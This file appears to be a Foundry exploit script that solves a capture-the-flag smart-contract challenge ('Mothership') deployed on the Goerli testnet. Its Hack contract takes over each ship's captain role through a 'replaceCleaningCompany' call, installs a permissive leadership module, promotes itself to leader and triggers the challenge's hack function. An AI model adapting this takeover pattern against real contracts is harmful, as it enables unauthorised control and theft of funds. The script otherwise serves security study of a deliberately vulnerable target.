// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/ChallengeMothership.sol";

contract HackModule {
    function isLeaderApproved(address) external pure {}
}

contract Hack {
    constructor(Mothership mothership) {
        bool success;
        uint256 fleetLength = mothership.fleetLength();
        HackModule hackModule = new HackModule();

        for(uint256 i = 1; i < fleetLength; ++i ) {
            SpaceShip spaceship = mothership.fleet(i);
            // Replace captain
            (success,) = address(spaceship).call(abi.encodeWithSignature("replaceCleaningCompany(address)", address(this)));
            require(success, "failed to replace captain");

            // replace leadership module
            spaceship.addModule(LeadershipModule.isLeaderApproved.selector,  address(hackModule));
        }

        // Add self to crew
        SpaceShip mainSpaceship = mothership.fleet(0);
        (success,) = address(mainSpaceship).call(abi.encodeWithSignature("addAlternativeRefuelStationsCodes(uint256)", address(this)));
        require(success, "failed to add to crew");
        // Clear captain
        (success,) = address(mainSpaceship).call(abi.encodeWithSignature("replaceCleaningCompany(address)", 0));
        require(success, "failed to clear captain");
        // Ask for captainship
        mainSpaceship.askForNewCaptain(address(this));

        // promote!
        mothership.promoteToLeader(address(this));
        mothership.hack();

        selfdestruct(payable(msg.sender));
    }
}

// https://goerli.etherscan.io/address/0xBf31Bde32D1F16cbB875e8e995040bBc2f077841
contract ChallengeMothershipScript is Script {
    address constant instance = 0xBf31Bde32D1F16cbB875e8e995040bBc2f077841;

    function run() public {
        vm.startBroadcast();

        Mothership mothership = Mothership(instance);
        new Hack(mothership);

        console.log("hacked?", mothership.hacked());
    }
}
